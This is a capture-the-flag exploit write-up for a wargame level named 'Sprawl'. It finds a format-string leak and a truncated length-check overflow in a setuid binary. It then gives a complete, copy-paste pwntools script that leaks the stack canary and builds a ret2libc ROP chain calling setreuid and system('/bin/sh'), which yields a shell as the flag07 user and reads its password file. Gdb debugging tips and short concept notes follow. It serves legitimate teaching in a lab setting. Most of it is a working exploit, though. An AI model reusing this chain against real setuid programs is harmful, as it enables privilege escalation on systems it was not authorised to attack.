# Sprawl (level07 → flag07) — Exploit Writeup

Copy-paste each block in order, in a terminal on the target box (`level07` user).

## 1. Recon the binary

```bash
file /home/level07/sprawl
checksec --file=/home/level07/sprawl
ls -la /home/level07/sprawl
```

Expect: amd64, dynamically linked, No PIE, **canary found**, NX enabled, Partial RELRO, SHSTK/IBT enabled, owner `flag07` with setuid bit (`-rwsr-x---`).

## 2. Get the strings and format strings

```bash
strings -a /home/level07/sprawl | less
objdump -d /home/level07/sprawl > /tmp/sprawl_disasm.txt
objdump -s -j .rodata /home/level07/sprawl
```

Key format strings found in `.rodata`:
- `route_tag()` prompt: `"[SPRAWL] Route tag: "`
- `read_header()` scanf format: `"%x %hx %hx"` → reads `magic` (u32), `count` (u16), `block_size` (u16)
- `process_packet()` prompts reference `count`/`block_size`/`checksum`

## 3. Identify the two bugs

**Bug A — format string vulnerability in `route_tag()`:**

```asm
lea -0x90(%rbp),%rax   ; your fgets'd input buffer
mov %rax,%rdi
mov $0x0,%eax
call printf             ; printf(your_buffer) — NO format string of its own!
```

Your route-tag input is passed directly as `printf`'s format string. Any `%p`/`%x`/`%n` in your input gets interpreted against the stack — this is our **canary leak primitive**.

**Bug B — mismatched validation in `process_packet()`:**

```c
size = (u16)(count * block_size);   // truncated to 16 bits
if (size > 0x40) reject;            // only this is checked

fread(buf, 1, count, stdin);        // but THIS unclamped value is what's read!
```

Setting `block_size = 0` makes `size = 0` (passes the check) while `count` can still be up to `65535` — a massive stack buffer overflow via `fread`, straight through the canary, saved RBP, and return address.

`buf` sits at `rbp-0x50`, canary at `rbp-0x8` → **offset to canary = 0x50 - 0x8 = 72 bytes** (confirmed from the disassembly's fixed frame layout).

## 4. Confirm ASLR and libc

```bash
cat /proc/sys/kernel/randomize_va_space   # expect 0 (off)
ldd /home/level07/sprawl                  # confirm libc path + load base
```

Same box/libc as other levels here: `/lib/x86_64-linux-gnu/libc.so.6`, base `0x7ffff7c00000`.

## 5. Confirm the target UID

```bash
grep flag07 /etc/passwd
```

→ UID `1024`.

## 6. Full exploit script

Save as `exploit.py`:

```python
from pwn import *

libc = 0x7ffff7c00000

ROP_RDI      = p64(libc + 0x000000000010c08d)  # pop rdi ; ret
ROP_RSI      = p64(libc + 0x0000000000110b7d)  # pop rsi ; ret
ROP_RET      = p64(libc + 0x0000000000028a92)  # ret (alignment)

ROP_SH       = p64(libc + 0x00000000001cc42f)  # "/bin/sh"
ROP_SYS      = p64(libc + 0x0000000000058750)  # system()
ROP_SETREUID = p64(libc + 0x0000000000127370)  # setreuid()
ROP_EXIT     = p64(libc + 0x0000000000047ba0)  # exit()

OWNER_UID    = p64(1024)  # confirmed flag07 UID

rop_chain  = ROP_RDI + OWNER_UID + ROP_RSI + OWNER_UID + ROP_SETREUID
rop_chain += ROP_RET + ROP_RET          # alignment fix before system()
rop_chain += ROP_RDI + ROP_SH + ROP_SYS
rop_chain += ROP_RDI + p64(0) + ROP_EXIT

p = process("/home/level07/sprawl", env={})

# --- Stage 1: leak and auto-detect the canary via the format string bug ---
probe_indices = list(range(20, 35))
probe = "|".join(f"%{i}$p" for i in probe_indices)

p.recvuntil(b"[SPRAWL] Route tag: ")
p.sendline(probe.encode())

leaked_line = p.recvline()
prefix = b"[SPRAWL] Routing via "
leaked_line = leaked_line[len(prefix):] if leaked_line.startswith(prefix) else leaked_line

values = leaked_line.strip().split(b"|")

canary = None
for v in values:
    v = v.strip()
    if v == b"(nil)":
        continue
    try:
        n = int(v, 16)
    except ValueError:
        continue
    if (n & 0xff) == 0 and n > 0xff and n.bit_length() > 16:
        canary = n
        break

if canary is None:
    log.error(f"Could not auto-detect canary in leaked values: {values}")

log.info(f"Leaked canary: {hex(canary)}")

# --- Stage 2: trigger the overflow with the real canary spliced in ---
p.recvuntil(b"[SPRAWL] Header (hex): ")

offset = 72
total_len = offset + 8 + 8 + len(rop_chain)
magics = f"0xDEADBEEF {hex(total_len)} 0"   # block_size=0 bypasses the size<=0x40 check
p.sendline(magics.encode())

p.recvuntil(b"bytes): ")

payload = b'\x00' * offset + p64(canary) + p64(0) + rop_chain
p.sendline(payload)

p.interactive()
```

Run it:

```bash
python3 exploit.py
```

A success line looks like:

```
[*] Leaked canary: 0x2094758988aaad00
[*] Switching to interactive mode
[SPRAWL] Packet 0 received. Checksum: 00000000
```

(No "stack smashing detected" message means the canary matched.)

## 7. Get the flag

At the interactive prompt:

```bash
id
cat /home/flag07/.pass
```

`id` should show `uid=1024(flag07)`.

---

## If the canary auto-detect fails

If you see `Could not auto-detect canary in leaked values: [...]`, paste the printed list — pick out the 16-hex-digit value ending in `00` manually and hardcode it as `%N$p` in place of the probe range.

## If it gets past the canary but still crashes

Same debugging approach as any ret2libc chain:

```bash
gdb -nx /home/level07/sprawl
b *0x7ffff7d27370    # libc + setreuid offset
b *0x7ffff7c58750    # libc + system offset
run < /tmp/payload    # (write your payload bytes to /tmp/payload first)
```

At each breakpoint: `info registers rdi rsi rip`, then `c` to continue. If `rip` lands inside a libc function like `do_system+...` rather than your own gadget addresses, suspect **stack alignment** — adjust the number of `ROP_RET` paddings before `system()`.

## Key concepts

- **Format string vulnerability**: calling `printf(user_input)` instead of `printf("%s", user_input)` lets an attacker read (and with `%n`, write) arbitrary stack/memory values by supplying format specifiers as data.
- **Mismatched validation bug**: a length check performed on one value (`count * block_size`, truncated) while a *different*, unchecked value (`count` alone) is what actually gets used in the dangerous operation (`fread`). The presence of *a* check doesn't mean the right thing got checked.
- **Stack canary bypass via leak**: a canary only stops *blind* overflows. If an attacker can read its value first (via an unrelated info leak elsewhere in the program) and simply reproduce it at the correct offset in their overflow payload, the canary check passes and classic return-address hijacking works exactly as if no canary existed.
- **ret2libc**, same as before: NX blocks stack shellcode, so we redirect execution into existing libc code (`setreuid` + `system("/bin/sh")`) via ROP gadgets instead of injecting new code.
